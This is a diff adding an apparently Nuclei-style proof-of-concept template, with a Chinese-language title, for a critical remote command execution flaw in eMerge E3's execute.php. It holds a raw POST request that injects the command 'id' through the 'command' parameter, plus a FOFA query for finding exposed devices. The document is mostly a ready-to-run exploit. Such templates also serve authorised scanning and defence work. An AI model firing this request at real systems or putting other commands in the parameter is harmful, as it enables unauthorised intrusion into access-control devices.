@@ -1,0 +1,33 @@
+id: poc-9556129442
+info:
+  name: eMerge E3 execute.php存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: rce,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: title="emerge"
+http:
+- raw:
+  - 'POST /diagnostic/controller/execute.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:109.0) Gecko/20100101 Firefox/115.0
+
+    Connection: keep-alive
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 25
+
+    action=execute&command=id'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
